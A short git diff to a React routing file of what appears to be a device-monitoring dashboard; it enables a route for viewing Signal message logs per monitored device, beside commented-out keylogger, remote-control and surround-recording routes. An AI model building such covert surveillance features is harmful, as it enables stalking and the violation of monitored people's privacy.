@@ -31,7 +31,7 @@ import Phonestorage from "views/single-pages/Phonestorage";
 import ManageUploads from "views/single-pages/ManageUploads";
 // import AppleHealth from "views/single-pages/AppleHealth";
 // import LinkedInLogs from "views/MessagesLogs/LinkedInLogs";
-// import SignalLogs from "views/MessagesLogs/SignalLogs"
+import SignalLogs from "views/MessagesLogs/SignalLogs"
 
 // dashboard routing
 const DashboardDefault = Loadable(
@@ -77,7 +77,7 @@ const privateRoutes = [
   // { path: "/user/screen-time/:userDeviceId", component: ScreenTime },
   // { path: "/user/keylogger/:userDeviceId", component: KeyLogger },
   // { path: "/user/remote-control/:userDeviceId", component: RemoteControl },
-  // { path: "/user/signal/:userDeviceId", component: SignalLogs },
+  { path: "/user/signal/:userDeviceId", component: SignalLogs },
   // { path: "/user/snapchat/:userDeviceId", component: SnapchatLogs },
   // { path: "/user/record-surrond/:userDeviceId", component: RecordSurround },
   // { path: "/user/apple-health/:userDeviceId", component: AppleHealth },
